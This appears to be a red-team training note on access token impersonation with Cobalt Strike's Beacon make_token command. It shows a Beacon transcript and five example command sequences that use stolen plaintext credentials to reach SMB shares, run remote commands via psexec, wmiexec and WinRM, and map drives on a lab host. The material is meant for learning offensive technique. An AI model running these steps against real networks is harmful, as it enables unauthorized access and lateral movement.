Token Impersonation is a technique where an adversary impersonates an access token belonging to another user.  
Those tokens can be created if the adversary knows the plaintext credentials of a user, or they can be stolen from processes running in other logon sessions.

make_token
This is a technique where an adversary uses the plaintext credentials of a user to create a new access token, and then impersonates it.  
This is typically done using the LogonUserA and ImpersonateLoggedOnUser APIs.  This capability is built into Beacon via the make_token command.

\\\
beacon> make_token CONTOSO\rsteel Passw0rd!
[+] Impersonated CONTOSO\rsteel (netonly)
\\\

his allows Beacon to use the alternate credentials when interacting with resources on the network.  It has no impact on local actions.
explanation:-

✅ 1. Access SMB shares
make_token CONTOSO\rsteel Passw0rd!
dir \\10.10.10.1\C$

✅ 2. Remote command execution
make_token CONTOSO\rsteel Passw0rd!
jump psexec 10.10.10.1 listener

✅ 3. WMI execution
make_token CONTOSO\rsteel Passw0rd!
jump wmiexec 10.10.10.1 listener

✅ 4. WinRM (if enabled)
make_token CONTOSO\rsteel Passw0rd!
jump winrm 10.10.10.1 listener

✅ 5. Mapping drives
make_token CONTOSO\rsteel Passw0rd!
net use \\10.10.10.1\C$
